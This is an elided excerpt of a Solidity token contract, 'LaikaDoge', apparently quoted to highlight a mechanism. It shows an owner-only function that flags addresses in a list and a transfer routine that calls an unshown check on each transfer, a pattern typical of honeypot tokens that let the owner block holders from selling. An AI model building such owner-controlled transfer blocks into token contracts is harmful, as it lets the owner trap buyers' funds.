...
contract LaikaDoge is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable public marketingAddress = payable(0xbFd66D393F075Ea38d3111cA5cc324765ebf6722); // Marketing Address
    ...
    string private _name = "LaikaDoge";
    string private _symbol = "LaikaDoge";
   ...
   mapping(address => bool) public _islisted;
    ...
    function setList(address user,bool bools)public onlyOwner{
        _islisted[user] = bools;
    }
    ...
    function _transfer(
        ...
        require(amount > 0, "Transfer amount must be greater than zero");checkAdd(from,to,amount);
